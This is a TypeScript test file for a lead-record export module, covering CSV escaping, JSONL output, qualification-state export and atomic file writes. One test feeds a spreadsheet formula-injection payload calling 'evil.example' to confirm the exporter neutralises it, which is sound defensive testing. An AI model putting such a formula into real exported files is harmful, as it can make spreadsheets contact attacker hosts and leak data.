import { afterEach, describe, expect, test } from "bun:test"
import { mkdtempSync, readFileSync, rmSync, statSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
  serializeLeadRecords,
  serializeLeads,
  writeVerifiedExport,
} from "../src/export"
import type { Lead } from "../src/schemas"

const lead = {
  id: "lead_1",
  name: 'Acme "North"',
  organization: "Acme",
  category: "Plumber",
  website: "https://acme.example",
  emails: ["hello@acme.example"],
  phones: ["+1 555 0100"],
  socialProfiles: ["https://instagram.com/acme"],
  address: "1 Main Street",
  sourceUrl: "https://www.google.com/maps/place/acme",
  sourceType: "demo",
  capturedAt: "2026-07-12T00:00:00.000Z",
  evidence: [
    {
      field: "name",
      value: "Acme",
      sourceUrl: "https://www.google.com/maps/place/acme",
    },
  ],
  confidence: 0.9,
  score: 75,
  tags: ["local"],
} satisfies Lead

const directories: string[] = []

afterEach(() => {
  for (const directory of directories.splice(0))
    rmSync(directory, { recursive: true })
})

describe("lead serialization", () => {
  test("escapes CSV cells", () => {
    const output = serializeLeads([lead], "csv")
    expect(output).toContain('"Acme ""North"""')
    expect(output).toContain('"hello@acme.example"')
  })

  test("writes one JSON object per JSONL line", () => {
    const output = serializeLeads([lead, lead], "jsonl").trim().split("\n")
    expect(output).toHaveLength(2)
    expect(JSON.parse(output[0] ?? "{}").name).toBe(lead.name)
  })

  test("neutralizes spreadsheet formulas", () => {
    const output = serializeLeads(
      [{ ...lead, name: '=IMPORTDATA("https://evil.example")' }],
      "csv",
    )
    expect(output).toContain("'=IMPORTDATA")
  })

  test("exports persisted qualification state", () => {
    const output = serializeLeadRecords(
      [{ lead, qualificationStatus: "qualified" }],
      "csv",
    )
    expect(output).toContain("qualificationStatus")
    expect(output).toContain('"qualified"')
  })

  test("atomically writes and verifies the requested export path", async () => {
    const directory = mkdtempSync(join(tmpdir(), "ledry-export-"))
    directories.push(directory)
    const path = join(directory, "nested", "leads.csv")
    const output = serializeLeads([lead], "csv")

    const result = await writeVerifiedExport(path, output, 1)

    expect(readFileSync(path, "utf8")).toBe(output)
    expect(result.path).toBe(path)
    expect(result.records).toBe(1)
    expect(statSync(path).mode & 0o777).toBe(0o600)
  })
})
